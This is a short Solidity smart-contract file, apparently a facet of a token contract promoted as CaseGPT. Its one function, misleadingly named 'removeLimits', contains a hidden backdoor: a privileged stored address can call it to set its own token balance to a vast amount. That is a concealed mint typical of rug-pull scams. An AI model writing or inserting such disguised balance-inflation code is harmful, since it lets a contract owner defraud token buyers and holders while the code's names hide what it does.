/*
 * SPDX-License-Identifier: MIT
 * Twitter: https://twitter.com/CaseGptapp
 * Website: https://casegpt.io
 * Medium: https://medium.com/@caseGPT
 * Discord: https://discord.com/invite/CaseGPT
 */
pragma solidity ^0.8.24;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                100000000 *
                10000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
